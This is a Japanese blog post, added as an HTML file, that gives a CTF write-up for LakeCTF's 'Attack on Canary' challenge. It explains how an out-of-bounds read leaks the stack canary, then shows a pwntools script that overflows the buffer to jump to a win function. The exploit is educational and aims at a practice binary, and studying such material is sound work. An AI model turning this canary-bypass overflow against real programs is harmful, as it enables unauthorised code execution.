@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  
+    <title>Lakectf Attack on Canary Writeups :: Ojun</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="LakectfのAttack on Canaryのwriteupです。" />
+<meta name="keywords" content="pwn, canary" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/tech/2022/9_26/lakectf/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="Ojun" />
+  
+
+  
+    <meta name="twitter:image" content="https://ojun.ga/posts/tech/2022/9_26/lakectf/img/canary.png" />
+  
+
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="ja" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Lakectf Attack on Canary Writeups">
+<meta property="og:description" content="LakectfのAttack on Canaryのwriteupです。" />
+<meta property="og:url" content="/posts/tech/2022/9_26/lakectf/" />
+<meta property="og:site_name" content="Ojun" />
+
+  <meta property="og:image" content="/img/canary.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-09-26 21:24:13 &#43;0900 JST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Ojun
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/tech/2022/9_26/lakectf/">Lakectf Attack on Canary Writeups</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-09-26
+        
+          [Updated: 2022-09-26]
+        
+      </span>
+    
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="/tags/%E3%83%8F%E3%83%83%E3%82%AD%E3%83%B3%E3%82%B0/">ハッキング</a>&nbsp;
+    
+  </span>
+  
+  
+  <img src="/posts/tech/2022/9_26/lakectf/img/canary.png"
+    class="post-cover"
+    alt="Lakectf Attack on Canary Writeups"
+    title="Cover Image" />
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        目次
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#概要">概要</a></li>
+    <li><a href="#バイナリ解析">バイナリ解析</a></li>
+    <li><a href="#攻撃の方針">攻撃の方針</a></li>
+    <li><a href="#スクリプト">スクリプト</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <h2 id="概要">概要<a href="#概要" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>実行可能ファイルが配られるので、実行アドレスをwin関数に飛ばしたらflagが得られるよという問題です。</p>
+<p><img src="img/canary.png" alt="problem"></p>
+<h2 id="バイナリ解析">バイナリ解析<a href="#バイナリ解析" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>ghidraでディスアセンブリ/デコンパイルすると次のような結果になりました。</p>
+<p><img src="img/disas.png" alt="disassemble"></p>
+<p>このプログラムは、プレイヤーに次の操作を可能にしています。</p>
+<ul>
+<li>配列(RBP-0x60)に格納されている値を8バイト単位で見ることができる。実はその配列の範囲を超えた部分も見られる。(以下、操作0)</li>
+<li>配列に好きな値を代入できる。&ldquo;max 8 bytes&quot;とあるが、実際には好きな長さの値を代入できる。(以下、操作1)</li>
+</ul>
+<h2 id="攻撃の方針">攻撃の方針<a href="#攻撃の方針" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>もちろん最終目的は、win関数の実行です。先ほどの通り、好きな大きさのデータを代入できるので、バッファオーバーフローが使えそうです。</p>
+<p>しかし、障害が一つ。canaryの存在です。</p>
+<p>バッファオーバーフローとは、プログラムが「次にここを実行しよう！」と思っている場所(RIP/EIP)を書き換えることで、プログラムの実行を任意に操作する手法です。</p>
+<p>しかし、我々がデータを注入できる場所とRIPの間にはcanaryというデータがあります。</p>
+<p>もちろん、バッファオーバーフロー時にはcanaryの値はメチャクチャになりますから、関数の実行前後でcanaryの値が変わっていた場合はプログラムが強制終了されます。つまり攻撃が失敗します。</p>
+<p>さて、これを回避するためにはどうすればよいでしょうか。もしcanaryの値が判明すれば、バッファオーバーフロー時にcanaryの部分だけ変わらないようにpayloadを作れますね。</p>
+<p>ここで使えるのが先ほどの機能です。</p>
+<p>まず、データを覗き見られる操作0を実行します。canaryのアドレスは[RBP-0x8]なので、我々が操作できる配列との差は $ 0x60 - 0x8 = 88 $。
+よって、&ldquo;Tell me which slot you wanna read: &ldquo;と聞かれたときには&quot;11&quot;と答えればcanaryが覗き見られますね。</p>
+<p>あとはretまでのoffsetを計算してwin関数を実行するだけです。</p>
+<h2 id="スクリプト">スクリプト<a href="#スクリプト" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>結論としては以下のスクリプトで問題が解けました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400837</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_command</span>(io, cmd: bytes):
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Your command: &#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(cmd)
+
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./exe&#34;</span>)
+<span style="color:#75715e">#io = remote(&#34;chall.polygl0ts.ch&#34;, 6100)</span>
+
+exec_command(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Tell me which slot you wanna read: &#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;11&#34;</span>)
+
+canary <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">8</span>)
+log<span style="color:#f92672">.</span>info(f<span style="color:#e6db74">&#34;canary: {canary}&#34;</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">88</span>
+payload <span style="color:#f92672">+=</span> canary
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> p64(win)
+
+exec_command(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Tell me how much you wanna write: &#34;</span>)
+io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;112&#34;</span>) <span style="color:#75715e"># 88 + 8 (canary) + 8 (ret) + 8 (win)</span>
+
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;What are the contents (max 8 bytes): &#34;</span>)
+io<span style="color:#f92672">.</span>sendline(payload)
+
+exec_command(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div>
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/tech/2022/8_15/shellctf/">
+                <span class="button__text">SHELLCTF writeup</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [['$','$'], ['\\(','\\)']],
+            displayMath: [['$$','$$']],
+            processEscapes: true,
+            processEnvironments: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+            TeX: { equationNumbers: { autoNumber: "AMS" },
+                extensions: ["AMSmath.js", "AMSsymbols.js"] }
+        }
+    });
+
+    MathJax.Hub.Queue(function() {
+        
+        
+        
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i = 0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+
+    MathJax.Hub.Config({
+        
+        TeX: { equationNumbers: { autoNumber: "AMS" } }
+    });
+
+</script>
+
+
+
+
+  
+</div>
+
+</body>
+</html>
